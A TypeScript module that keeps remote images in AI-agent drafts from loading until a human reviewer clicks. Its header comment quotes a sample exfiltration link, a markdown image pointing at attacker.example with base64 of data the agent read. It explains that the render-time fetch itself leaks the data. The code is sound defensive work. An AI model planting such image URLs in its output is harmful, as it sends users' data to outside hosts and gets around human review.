/**
 * Remote images are NOT fetched until the reviewer asks for them.
 *
 * The review window is a real browser engine, so an `<img src="https://…">` in a draft is a GET to a
 * host the agent chose, issued at render time, before any decision. A URL carries data:
 *
 *     ![status](https://attacker.example/p.png?d=<base64 of something the agent read>)
 *
 * Rejecting afterwards is no mitigation: the request is the payload. The CSP alone does not stop it
 * (`img-src https:` admits the load). "Jira would fetch the same URL anyway" is false for Slack,
 * which renders the image as a plain link and never fetches it.
 *
 * The CSP keeps `img-src https:` (dropping it would grey out every image for every reviewer, and
 * images in drafts are almost always innocent). The renderer sets `src` only on a click, in the
 * sandboxed renderer: no privileged fetch, no IPC.
 *
 * `data:` and `blob:` render at once: the bytes are already in the document, so no request is made.
 */

/** Schemes that reach the network when they land in a `src`. Everything else is already local. */
const REMOTE = /^(?:https?|ftp):/i;

export function isRemoteImage(src: string): boolean {
  return REMOTE.test(src.trim());
}

export interface DeferredImageOptions {
  src: string;
  alt: string;
  /** Called after the reviewer asks for it, so a caller can count loads. */
  onLoad?(): void;
}

/**
 * Build the placeholder element for one remote image.
 *
 * Plain DOM, not React: this is a ProseMirror node view, which the editor owns. The URL is shown in
 * full and selectable, because an elided host is how a lookalike domain gets through.
 */
export function deferredImage({ src, alt, onLoad }: DeferredImageOptions): HTMLElement {
  const wrap = document.createElement('span');
  wrap.className = 'dg-img-defer';

  const button = document.createElement('button');
  button.type = 'button';
  button.className = 'dg-img-load';
  button.textContent = 'Load image';
  // The editor is contenteditable; without this, clicking the button puts a cursor in it instead.
  button.contentEditable = 'false';
  button.setAttribute('aria-label', `Load the image at ${src}`);

  const label = document.createElement('span');
  label.className = 'dg-img-alt';
  label.textContent = alt || 'image';

  const url = document.createElement('code');
  url.className = 'dg-img-url';
  url.textContent = src;

  const note = document.createElement('span');
  note.className = 'dg-img-note';
  note.textContent = 'not loaded -- fetching it would contact this host';

  wrap.append(button, label, url, note);

  button.addEventListener('click', (event) => {
    // The click belongs to the button, not to the document: bubbling puts the selection in the
    // editor and can scroll the draft.
    event.preventDefault();
    event.stopPropagation();
    const img = document.createElement('img');
    img.alt = alt;
    // Last: setting `src` is the request.
    img.src = src;
    wrap.replaceChildren(img);
    wrap.classList.add('dg-img-loaded');
    onLoad?.();
  });

  return wrap;
}
